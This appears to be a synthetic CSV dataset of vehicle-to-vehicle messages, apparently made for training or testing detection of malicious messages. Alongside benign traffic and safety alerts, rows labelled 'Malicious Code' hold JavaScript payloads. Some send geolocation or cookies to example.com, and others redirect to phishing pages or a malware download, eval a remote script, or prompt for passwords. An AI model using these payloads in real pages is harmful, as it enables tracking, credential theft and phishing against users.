Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
12:24.5,vehicle_67,car,47.62058108,-122.3826729,1.581398531,Safety,Beware of Construction zones.,foggy
36:15.1,vehicle_61,truck,47.64563833,-122.3695188,93.23916631,Safety,Stay away from Power outages.,foggy
00:36.9,vehicle_77,car,47.64907654,-122.3782712,32.18732642,Traffic Update,Gridlock on Route 66.,clear
48:09.0,vehicle_49,truck,47.69727851,-122.3690199,70.29949428,Safety,Beware of Debris.,rainy
53:23.1,vehicle_82,motorcycle,47.66567964,-122.3985036,70.53922435,Emergency Update,Traffic diversion locally.,snowy
27:33.3,vehicle_83,car,47.68887384,-122.3578534,28.7122393,Traffic Update,Heavy congestion on Highway 1.,rainy
09:03.6,vehicle_47,car,47.65241008,-122.3327547,13.54342345,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
50:18.2,vehicle_52,motorcycle,47.63213801,-122.3335232,17.21148273,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
14:18.1,vehicle_9,motorcycle,47.63741236,-122.3605311,51.93984885,Traffic Update,Tailback on Route 66.,clear
22:13.3,vehicle_64,truck,47.63256596,-122.3701071,34.27943845,Emergency Update,Emergency traffic in your jurisdiction.,rainy
58:17.9,vehicle_96,truck,47.62337282,-122.3525869,105.9677938,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
27:18.9,vehicle_31,motorcycle,47.61311902,-122.3605344,84.13438488,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
02:29.4,vehicle_96,truck,47.6616482,-122.3833644,4.306356844,Traffic Update,Tailback on A1.,rainy
16:28.5,vehicle_65,truck,47.65591246,-122.3682551,79.85584211,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
23:36.2,vehicle_84,motorcycle,47.65355723,-122.3210646,22.24050098,Emergency Update,Natural disaster in your locale.,rainy
34:26.3,vehicle_57,truck,47.6028125,-122.3625916,42.29393618,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
51:52.5,vehicle_46,truck,47.61937483,-122.3334361,56.77366512,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
24:34.7,vehicle_63,car,47.65376851,-122.3939728,11.16671048,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
19:44.2,vehicle_56,motorcycle,47.64030024,-122.3897285,74.10109812,Safety,Be on the lookout for Detours.,rainy
22:36.8,vehicle_26,car,47.61785117,-122.3089904,88.56314924,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
56:51.1,vehicle_27,motorcycle,47.61999916,-122.322923,14.76589316,Safety,Be on the lookout for Low visibility due to fog or smoke.,snowy
27:02.5,vehicle_61,truck,47.6944899,-122.3225627,78.97958131,Safety,Be alert to Debris.,foggy
34:21.1,vehicle_82,car,47.66127934,-122.3662616,71.25947585,Traffic Update,Stop-and-go traffic on State Highway 1.,foggy
58:05.6,vehicle_81,truck,47.66814118,-122.3092925,61.52375131,Traffic Update,Tailback on A1.,clear
04:34.9,vehicle_16,truck,47.65584405,-122.3000224,36.16384983,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
19:00.7,vehicle_5,truck,47.62970815,-122.3440225,5.589819521,Emergency Update,Detour due to emergency in your community.,snowy
34:46.6,vehicle_20,motorcycle,47.65574592,-122.3514616,18.34590767,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
04:38.7,vehicle_20,car,47.63825901,-122.3149177,55.173772,Emergency Update,Road collapse in your jurisdiction.,snowy
09:03.6,vehicle_25,motorcycle,47.65250588,-122.336262,99.15810329,Traffic Update,Tailback on A1.,foggy
24:12.9,vehicle_0,truck,47.64466043,-122.3002811,71.63926293,Safety,Be alert to Wildlife crossing.,clear
09:53.6,vehicle_50,motorcycle,47.63201085,-122.3304171,8.008755191,Traffic Update,Traffic jam on I-95.,rainy
44:25.7,vehicle_52,truck,47.60660066,-122.3644927,103.5842865,Emergency Update,Hazardous materials incident in your surrounding area.,foggy
58:06.0,vehicle_79,motorcycle,47.67045706,-122.3814493,2.210799665,Safety,Be alert to Slippery roads due to rain or snow.,rainy
33:12.3,vehicle_42,car,47.68892018,-122.3868977,71.62652892,Emergency Update,Power outage in your part of town.,clear
05:38.8,vehicle_53,car,47.66020095,-122.3198407,76.56068093,Safety,Be aware of Accidents.,snowy
42:16.0,vehicle_88,truck,47.61090154,-122.3345871,15.92566528,Traffic Update,Traffic is at a standstill on the northbound lanes of Bundesautobahn 1.,rainy
49:43.5,vehicle_76,car,47.65239791,-122.3045177,56.56182182,Safety,Look out for Road construction.,snowy
55:25.7,vehicle_53,truck,47.64986258,-122.3197709,55.58536557,Emergency Update,Water crisis in your part of town.,clear
39:51.5,vehicle_38,truck,47.64750744,-122.3454741,85.44726449,Traffic Update,At-a-standstill traffic on US-101.,rainy
07:19.4,vehicle_31,motorcycle,47.6169163,-122.3933231,73.25351422,Traffic Update,Severe traffic congestion on National Highway 1.,snowy
34:04.9,vehicle_18,car,47.60737213,-122.38461,57.46402509,Emergency Update,Infrastructure collapse in your surrounding area.,rainy
37:46.7,vehicle_91,motorcycle,47.6365843,-122.381037,49.41355471,Traffic Update,Slow traffic on I-95.,clear
29:01.9,vehicle_66,car,47.60211271,-122.3844904,46.37299467,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
12:34.9,vehicle_5,car,47.61471107,-122.3748014,113.1210086,Emergency Update,Power outage in your vicinity.,foggy
18:09.7,vehicle_21,truck,47.64569707,-122.316303,42.41284161,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
12:31.9,vehicle_29,motorcycle,47.65900169,-122.3332333,101.4448299,Safety,Look out for Icy roads.,foggy
16:43.0,vehicle_91,car,47.68880779,-122.3909596,109.4151697,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
17:26.5,vehicle_54,truck,47.6829621,-122.3832908,15.14365878,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
18:15.6,vehicle_61,motorcycle,47.61870208,-122.311426,114.0097318,Traffic Update,At-a-standstill traffic on Main Street.,snowy
12:21.0,vehicle_80,truck,47.66291477,-122.3594016,8.797263893,Traffic Update,Traffic bottleneck on Route 66.,clear
11:23.3,vehicle_18,car,47.62668111,-122.3572369,109.3165106,Safety,Exercise caution regarding Debris.,snowy
35:31.4,vehicle_56,motorcycle,47.6878544,-122.3734322,105.6710861,Safety,Stay informed about Low visibility due to fog or smoke.,snowy
05:53.2,vehicle_63,motorcycle,47.67189288,-122.3229766,89.68189523,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
40:20.9,vehicle_3,truck,47.63939701,-122.3042674,100.6743099,Emergency Update,Major traffic collision in your vicinity.,rainy
29:43.4,vehicle_20,car,47.66991657,-122.3809162,58.03159948,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
58:59.6,vehicle_25,truck,47.60435045,-122.3616414,107.138117,Safety,Take precautions against Icy roads.,foggy
27:33.0,vehicle_20,motorcycle,47.60173322,-122.3416977,47.13369777,Traffic Update,Heavy traffic on I-95.,foggy
43:08.9,vehicle_72,truck,47.61065414,-122.3918695,110.5625474,Safety,Avoid Uneven surfaces.,foggy
51:38.5,vehicle_94,motorcycle,47.68806542,-122.3321065,104.2523389,Emergency Update,Multi-vehicle accident in your part of town.,foggy
52:32.3,vehicle_30,motorcycle,47.62038079,-122.3100198,45.80778864,Traffic Update,At-a-standstill traffic on Interstate 40.,rainy
02:21.0,vehicle_18,truck,47.68888388,-122.3722042,11.32984579,Safety,Beware of Road closures.,clear
31:33.8,vehicle_60,car,47.66706453,-122.3082216,52.96998948,Traffic Update,Stop-and-go traffic on Route 66.,rainy
29:31.2,vehicle_4,truck,47.64501499,-122.3410912,41.62761474,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
44:27.8,vehicle_6,truck,47.68272048,-122.359301,118.5247751,Traffic Update,Severe traffic congestion on National Highway 1.,clear
27:27.4,vehicle_73,motorcycle,47.63869538,-122.356106,10.42309967,Emergency Update,Active shooter locally.,rainy
56:43.7,vehicle_62,truck,47.67516267,-122.3004432,45.53775584,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
29:02.5,vehicle_60,car,47.69645532,-122.3348775,5.243520894,Traffic Update,Stop-and-go traffic on Autostrada A1.,snowy
13:21.4,vehicle_58,truck,47.64212969,-122.3251999,83.70034327,Emergency Update,Traffic diversion in your immediate area.,rainy
35:30.7,vehicle_35,car,47.62953437,-122.3697508,70.15437651,Safety,Be cautious of Potholes.,snowy
27:35.6,vehicle_30,truck,47.69896728,-122.3423716,21.32411719,Emergency Update,Natural disaster in your locale.,rainy
24:59.5,vehicle_76,car,47.6045668,-122.3953209,8.576685351,Emergency Update,Power outage locally.,snowy
34:19.2,vehicle_30,truck,47.69125396,-122.3933603,108.7683874,Safety,Take precautions against Icy roads.,rainy
33:50.0,vehicle_72,car,47.60461361,-122.3649581,5.754475236,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
35:10.7,vehicle_28,truck,47.66059107,-122.3116644,66.0797389,Traffic Update,Stop-and-go traffic on Provincial Highway 1.,clear
20:59.9,vehicle_52,car,47.63662981,-122.3976124,101.2765652,Traffic Update,Traffic jam on State Highway 1.,clear
04:19.1,vehicle_31,car,47.68408839,-122.3467557,114.8444995,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
53:52.7,vehicle_81,motorcycle,47.6510049,-122.3419543,72.79839252,Traffic Update,Traffic backup on I-95.,rainy
16:36.7,vehicle_8,motorcycle,47.6383641,-122.3753866,77.02902712,Emergency Update,Infrastructure collapse in your jurisdiction.,snowy
14:24.0,vehicle_6,motorcycle,47.62560196,-122.3409715,53.78862294,Emergency Update,Major traffic collision in your part of town.,snowy
32:25.6,vehicle_81,motorcycle,47.60958963,-122.3524679,104.3350834,Traffic Update,Traffic is at a standstill on the northbound lanes of Avenue.,snowy
03:06.9,vehicle_10,car,47.6799065,-122.3613843,16.1140218,Traffic Update,Slow traffic on Route 66.,clear
48:48.4,vehicle_95,truck,47.65043191,-122.3314989,96.66948115,Traffic Update,Traffic jam on Avenue.,foggy
36:12.6,vehicle_79,truck,47.6837376,-122.3958561,34.21015003,Emergency Update,Traffic accident in your locality.,snowy
42:07.3,vehicle_0,motorcycle,47.65857599,-122.3232884,102.2287818,Emergency Update,Major traffic collision in your community.,foggy
23:58.2,vehicle_76,truck,47.62617199,-122.326373,4.425358915,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
07:19.0,vehicle_46,car,47.66779253,-122.3921476,2.887761711,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
52:21.9,vehicle_14,truck,47.68438609,-122.3161447,67.58360409,Traffic Update,Traffic jam on State Highway 1.,clear
49:32.5,vehicle_87,motorcycle,47.65356604,-122.3106765,75.21037864,Safety,Stay informed about Road construction.,snowy
43:03.0,vehicle_19,motorcycle,47.62379212,-122.3248615,31.32909919,Traffic Update,Heavy traffic on Autostrada A1.,clear
55:10.2,vehicle_56,motorcycle,47.67402589,-122.3270414,30.79440109,Emergency Update,Head-on collision in your jurisdiction.,clear
12:04.6,vehicle_47,motorcycle,47.68790572,-122.3669151,24.06705046,Emergency Update,Active shooter in your vicinity.,snowy
36:51.4,vehicle_83,car,47.62427419,-122.3142195,57.95689762,Emergency Update,Traffic accident in your part of town.,snowy
51:03.9,vehicle_88,car,47.66807846,-122.3406963,17.05618609,Traffic Update,Severe traffic congestion on Interstate 40.,snowy
34:30.5,vehicle_93,motorcycle,47.64723942,-122.323878,87.20894518,Emergency Update,Traffic diversion nearby.,rainy
35:52.5,vehicle_53,truck,47.63094642,-122.3828623,56.89945568,Emergency Update,Multi-vehicle accident in your part of town.,snowy
54:10.2,vehicle_87,truck,47.65433261,-122.3640409,99.8923165,Safety,Exercise caution regarding Icy roads.,rainy
10:08.7,vehicle_90,car,47.61225046,-122.3727192,93.76554928,Traffic Update,At-a-standstill traffic on A1.,clear
24:04.4,vehicle_5,truck,47.61996255,-122.3677459,15.59443063,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
21:45.0,vehicle_8,car,47.65755037,-122.3533749,31.84073109,Traffic Update,Traffic is at a standstill on the northbound lanes of Local Street.,clear
10:26.8,vehicle_60,truck,47.64559255,-122.3795852,107.6526296,Traffic Update,Traffic bottleneck on Main Street.,rainy
12:15.3,vehicle_73,car,47.67868618,-122.3793933,22.85983647,Safety,Be on the lookout for Slippery roads due to rain or snow.,snowy
04:57.7,vehicle_31,truck,47.62973617,-122.3279901,9.274789332,Emergency Update,Terrorist attack in your region.,rainy
08:28.7,vehicle_48,motorcycle,47.68575365,-122.3633892,50.27566586,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
55:41.4,vehicle_54,truck,47.68664063,-122.3471106,56.42416425,Emergency Update,Head-on collision in your jurisdiction.,rainy
07:11.2,vehicle_94,truck,47.63306515,-122.3236334,98.00816666,Safety,Stay away from Slippery roads due to rain or snow.,rainy
57:30.8,vehicle_61,motorcycle,47.67341693,-122.3998257,36.85931985,Safety,Exercise caution regarding Debris.,clear
40:34.7,vehicle_12,motorcycle,47.67373742,-122.3103833,85.34655657,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
08:53.6,vehicle_29,car,47.63540606,-122.3105155,73.60428507,Emergency Update,Bridge collapse in your locale.,rainy
49:57.4,vehicle_34,car,47.69095475,-122.3059254,70.38792602,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
42:20.7,vehicle_32,truck,47.65909403,-122.3096437,71.78037611,Emergency Update,Major traffic collision in your community.,rainy
12:31.2,vehicle_40,truck,47.60013446,-122.3007363,67.89911165,Safety,Be cautious of Debris.,snowy
44:51.6,vehicle_69,truck,47.66018574,-122.3249364,19.15603336,Safety,Take precautions against Potholes.,clear
26:17.5,vehicle_86,motorcycle,47.62902204,-122.3237998,98.53332293,Traffic Update,Traffic jam on Drive.,snowy
31:04.9,vehicle_13,truck,47.63296311,-122.3512643,48.88465983,Safety,Be alert to Detours.,clear
52:03.6,vehicle_34,motorcycle,47.60809375,-122.3189488,98.95081676,Emergency Update,Infrastructure collapse locally.,rainy
26:46.3,vehicle_0,truck,47.67649149,-122.3194638,48.20154138,Emergency Update,Traffic diversion in your part of town.,foggy
51:09.0,vehicle_58,truck,47.64046944,-122.3851399,55.50670481,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
42:56.4,vehicle_38,motorcycle,47.65213804,-122.3190476,109.420801,Traffic Update,Traffic backup on M25.,snowy
47:32.1,vehicle_2,car,47.61935461,-122.3705272,64.88790522,Traffic Update,Tailback on I-95.,clear
42:33.5,vehicle_24,motorcycle,47.6075766,-122.3088866,17.8800156,Traffic Update,Tailback on I-95.,foggy
25:57.1,vehicle_98,truck,47.67281881,-122.3492483,92.8274787,Safety,Stay away from Inclement weather.,foggy
26:59.5,vehicle_17,car,47.65408446,-122.3841751,118.3257314,Emergency Update,Civil unrest in your part of town.,foggy
15:51.0,vehicle_95,truck,47.69415771,-122.3404346,87.96052863,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
14:56.4,vehicle_36,car,47.6917294,-122.3990071,114.2245698,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
30:29.8,vehicle_46,car,47.6280612,-122.347847,72.98886606,Safety,Be on the lookout for Low visibility due to fog or smoke.,clear
59:26.8,vehicle_92,car,47.66106762,-122.3050145,20.06751272,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
33:09.5,vehicle_93,motorcycle,47.68202918,-122.3755586,20.23336587,Traffic Update,Traffic backup on US-101.,rainy
15:18.0,vehicle_64,truck,47.67468453,-122.3235532,75.52144183,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
23:39.6,vehicle_37,car,47.63121035,-122.3288846,49.39435469,Traffic Update,Stop-and-go traffic on Boulevard.,snowy
54:20.9,vehicle_71,truck,47.63310057,-122.318094,44.48953754,Safety,Be aware of Uneven surfaces.,foggy
